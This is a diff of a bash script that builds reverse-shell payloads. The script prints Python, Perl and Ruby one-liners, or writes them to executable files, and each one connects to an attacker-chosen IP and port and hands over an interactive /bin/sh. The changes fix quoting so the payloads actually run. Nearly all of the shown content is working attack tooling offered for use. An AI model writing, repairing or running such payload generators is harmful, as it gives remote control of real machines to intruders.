@@ -103,7 +103,7 @@ fi
 
 	echo -e "\033[33;7m#######################################\e[0m \n \n ";
 	echo -e "This is script Python [1] \n \n "
-	echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$MY_IP\",$MY_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" 
+	echo "python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$MY_IP\",$MY_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" 
 	
 
 
@@ -115,7 +115,7 @@ fi
 	echo -e "\033[33;7m#######################################\e[0m \n \n ";
 	echo  "#!/usr/bin/env python " > $file1
 	echo -e "\n "
-	echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$MY_IP\",$MY_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" >> $file1 
+	echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$MY_IP\",$MY_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);" >> $file1 
 	echo -e "\n "
 	echo -e "This is the script save by file name  [ $file1 ] "
 	chmod +x $file1
@@ -154,7 +154,7 @@ fi
 	 
 	echo -e "\033[33;7m#######################################\e[0m \n \n ";
 	echo -e "This is script Perl [1] \n \n "
-	echo  "perl -e 'use Socket;$i=$MY_IP;$p=$MY_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' "
+	echo  "perl -e 'use Socket;\$i=\"$MY_IP\";\$p=$MY_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' "
 
 
 	elif [[ $perl == 2 ]]; then
@@ -165,7 +165,7 @@ fi
 	echo -e "\n \n ";
 	echo -e "\033[33;7m#######################################\e[0m \n \n ";
 	echo  "#!/usr/bin/perl -w" >  $file2
-	echo  "perl -e 'use Socket;$i=$MY_IP;$p=$MY_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' " >> $file2
+	echo  "use Socket;\$i=\"$MY_IP\";\$p=$MY_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};" >> $file2
 	echo -e "This is the script save by file name [ $file2 ] "
 	chmod +x $file2
 
@@ -191,7 +191,7 @@ fi
 	 
 	echo -e "\033[33;7m#######################################\e[0m \n \n ";
 	echo -e "This is script Ruby [1] \n \n "
-	echo  "ruby -rsocket -e'f=TCPSocket.open($MY_IP,$MY_PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)' "
+	echo  "ruby -rsocket -e'f=TCPSocket.open(\"$MY_IP\",$MY_PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)' "
 
 
 	elif [[ $Ruby == 2 ]]; then
@@ -201,7 +201,7 @@ fi
 	read -p "What is File name ? " file3
 	echo -e "\n \n ";
 	echo -e "\033[33;7m#######################################\e[0m \n \n ";
-	echo  "ruby -rsocket -e'f=TCPSocket.open($MY_IP,$MY_PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)' " > $file3
+	echo  "ruby -rsocket -e'f=TCPSocket.open(\"$MY_IP\",$MY_PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)' " > $file3
 	echo -e "This is the script save by file name [ $file3 ]"
 	chmod +x $file3
 
